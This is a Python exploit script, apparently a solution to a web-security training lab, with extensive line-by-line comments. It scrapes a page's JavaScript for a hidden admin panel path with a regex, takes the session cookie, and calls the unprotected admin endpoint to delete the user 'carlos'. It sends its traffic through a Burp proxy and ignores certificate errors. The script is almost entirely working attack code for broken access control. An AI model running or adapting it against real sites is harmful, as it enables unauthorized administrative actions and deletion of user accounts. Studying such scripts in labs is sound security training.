import requests          # Library used to send HTTP requests (GET, POST, etc.)
import sys               # Lets us read command-line arguments (like the URL you pass)
import urllib3           # Used here only to turn off HTTPS warning messages
from bs4 import BeautifulSoup   # For parsing HTML (like a browser that reads HTML)
import re                # Regex library used for pattern searching in text

# Disable SSL certificate warnings so the script doesn't print ugly messages
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Tell Python to send ALL HTTP/HTTPS traffic through your Burp Suite proxy at 127.0.0.1:8080
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def delete_user(url):

    # Send a GET request to the main lab page
    # verify=False → ignore SSL certificate (because labs use self-signed certs)
    r = requests.get(url, verify=False, proxies=proxies)

    # Extract the session cookie the server gives us.
    # We need this cookie later when deleting Carlos.
    session_cookie = r.cookies.get_dict().get('session')

    # --- FINDING THE ADMIN PANEL PATH --------------------------------------

    # Convert the HTML into a BeautifulSoup object so we can search inside it.
    soup = BeautifulSoup(r.text, 'lxml')
    # NOTE: admin_instances is NOT used anymore but this is what it does:
    # It tries to find ANY text node that contains "/admin-"
    # Many labs used to put the admin URL inside the HTML itself.
    admin_instances = soup.find(string=re.compile("/admin-"))

    # BELOW IS THE REGEX THAT ACTUALLY WORKS WITH THE NEW LAB FORMAT.
    # We apply it directly to the entire HTML text, not just one tag.

    # This regex: r"setAttribute\('href',\s*'(/admin-[A-Za-z0-9]+)'"
    #
    # Let's break it down ***slowly and simply***:
    #
    # 1. setAttribute\('href',
    #    → Match the literal characters:  setAttribute('href',
    #      ▸ The backslashes escape the parentheses so regex sees them as real characters.
    #
    # 2. \s*
    #    → This means “maybe there is space here, maybe not.”
    #      It prevents the regex from failing because some labs have:
    #           'href','/admin-xxxx'
    #      and others have:
    #           'href', '/admin-xxxx'
    #
    # 3. '(/admin-[A-Za-z0-9]+)'
    #    → The single quote '
    #    → Then (/admin-...)
    #       The parentheses ( ) mean:
    #         "REGEX, please capture this exact part so I can extract it later."
    #
    #    → /admin-   (this always appears in these labs)
    #
    #    → [A-Za-z0-9]+
    #        This means: one or more characters that are:
    #           A–Z
    #           a–z
    #           0–9
    #      Basically: the random string after "/admin-"
    #
    # 4. The final single quote '
    #
    # The result:
    #   It finds things like:
    #       setAttribute('href', '/admin-2evpxh')
    #
    # And returns ONLY:
    #       /admin-2evpxh
    #
    match = re.search(r"setAttribute\('href',\s*'(/admin-[A-Za-z0-9]+)'", r.text)

    # If regex successfully found the hidden admin path:
    if match:
        admin_path = match.group(1)
        # match.group(1) returns ONLY what was inside the ( ) capture group
        print("[+] Admin path:", admin_path)
    else:
        # If not found, print error and stop deleting Carlos
        print("[-] Admin path not found!")
        return

    # --- DELETE CARLOS ------------------------------------------------------

    # To delete a user, the admin endpoint requires a valid session cookie.
    cookies = {'session': session_cookie}

    # Build the full URL to delete user "carlos"
    # Example:  https://site/admin-xxxxx/delete?username=carlos
    delete_carlos_url = url + admin_path + '/delete?username=carlos'

    # Send GET request to delete user Carlos with the right cookie
    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)

    # If the server responds with HTTP 200 → delete success
    if r.status_code == 200:
        print("(+) User: Carlos deleted")
    else:
        print("(+) Deletion Failed.")
        print("(+) Exiting script...")
        sys.exit(-1)


def main():
    # Check if user passed exactly 1 argument (the URL)
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting User Carlos...")
    delete_user(url)

# This is executed ONLY when running the script directly
#   python3 lab-02.py https://example.com
if __name__ == '__main__':
    main()
